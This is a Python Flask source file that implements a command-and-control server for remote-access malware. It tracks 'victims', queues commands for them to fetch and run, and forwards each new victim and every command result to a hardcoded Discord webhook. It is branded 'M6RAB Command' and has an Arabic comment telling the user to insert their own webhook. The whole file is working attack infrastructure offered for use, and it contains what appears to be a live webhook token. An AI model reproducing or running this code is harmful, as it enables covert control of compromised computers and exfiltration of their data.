from flask import Flask, request, jsonify
import requests, json, time, os

app = Flask(__name__)

# ==========================================
# ضع رابط الويب هوك حقك هنا
WEBHOOK_URL = "https://discord.com/api/webhooks/1562594749142016112/Wrs_Gp2hzL9-EiIFoNe2-ZQnMPuUx6mJYWxA5vU979RlAEhpjbeE0ZHYkmugwVpsIayo"
# ==========================================

VICTIMS = {} 
COMMANDS = {} 

@app.route('/new_victim', methods=['POST'])
def new_victim():
    data = request.json
    vid = str(len(VICTIMS) + 1) 
    VICTIMS[vid] = {"id": vid, "ip": data.get('ip'), "time": time.ctime()}
    
    msg = f"**New Victim Connected!** ☠️\n**ID:** {vid}\n**Time:** {time.ctime()}"
    requests.post(WEBHOOK_URL, json={"content": msg, "username": "M6RAB Command"})
    
    return jsonify({"status": "ok", "id": vid}), 200

@app.route('/send_command', methods=['POST'])
def send_command():
    data = request.json
    vid = data.get('vid')
    cmd = data.get('cmd')
    COMMANDS[vid] = cmd
    return jsonify({"status": "sent"}), 200

@app.route('/check_command/<vid>', methods=['GET'])
def check_command(vid):
    if vid in COMMANDS:
        cmd = COMMANDS[vid]
        del COMMANDS[vid] 
        return jsonify({"command": cmd}), 200
    return jsonify({"command": "none"}), 200

@app.route('/result', methods=['POST'])
def result():
    data = request.json
    vid = data.get('vid')
    result_text = data.get('result')
    
    msg = f"**Result from Victim {vid}**\n{result_text}"
    requests.post(WEBHOOK_URL, json={"content": msg, "username": "M6RAB Command"})
    return jsonify({"status": "ok"}), 200

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080)
